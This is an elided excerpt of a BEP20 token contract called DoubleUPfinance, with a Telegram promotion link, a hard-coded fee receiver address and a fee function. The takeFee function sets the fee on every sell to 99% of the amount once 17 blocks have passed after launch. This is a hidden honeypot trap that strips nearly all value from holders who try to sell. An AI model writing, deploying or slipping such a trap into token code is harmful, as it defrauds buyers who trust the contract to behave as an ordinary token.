...
𝕋𝕖𝕝𝕖𝕘𝕣𝕒𝕞 : 𝕙𝕥𝕥𝕡𝕤://𝕥.𝕞𝕖/𝕕𝕠𝕦𝕓𝕝𝕖𝕦𝕡𝕗𝕚𝕟𝕒𝕟𝕔𝕖
...
contract DoubleUPfinance is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "DoubleUPfinance";
    string constant _symbol = "DoubleUp";
    ...
    constructor () Auth(msg.sender) {
        ...
        BuybackFeeReceiver = 0xc90DfaB907436F52b80BFf06D5A46301E342d430;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 17 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
